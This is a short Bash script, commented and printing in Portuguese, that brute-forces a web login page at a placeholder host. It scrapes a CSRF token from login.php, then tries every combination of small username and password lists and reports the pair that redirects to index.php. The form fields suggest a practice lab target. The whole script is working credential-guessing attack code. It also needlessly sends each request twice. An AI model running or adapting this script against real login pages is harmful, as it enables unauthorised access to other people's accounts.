#!/usr/bin/env bash

HOST="X"

USUARIOS=(
"teste"
"admin"
"novo"
"teste"
"luan"
)

SENHA=(
"teste2"
"novo"
"admin"
"password"
"arnaldo"
)


USER_TOKEN="$( curl -s -c cookie "${HOST}/login.php" | egrep -o "[a-z|A-Z|0-9]{32}" )"

for user in "${USUARIOS[@]}"; do 
	
	for pass in "${SENHA[@]}"; do 

		REQUEST="$( curl -s -i -b cookie --data "username=${user}&password=${pass}&user_token=${USER_TOKEN}&Login=Login" "${HOST}/login.php" )"
		echo "$( curl -s -i -b cookie --data "username=${user}&password=${pass}&user_token=${USER_TOKEN}&Login=Login" "${HOST}/login.php" )" | grep "Location: index.php" 1>/dev/null
		[ "$?" -eq 0 ] && echo -e "A senha\e[1;31m ${pass}\e[0m funcionou para o usuário\e[1;32m ${user}\e[0m"

	done 
done 



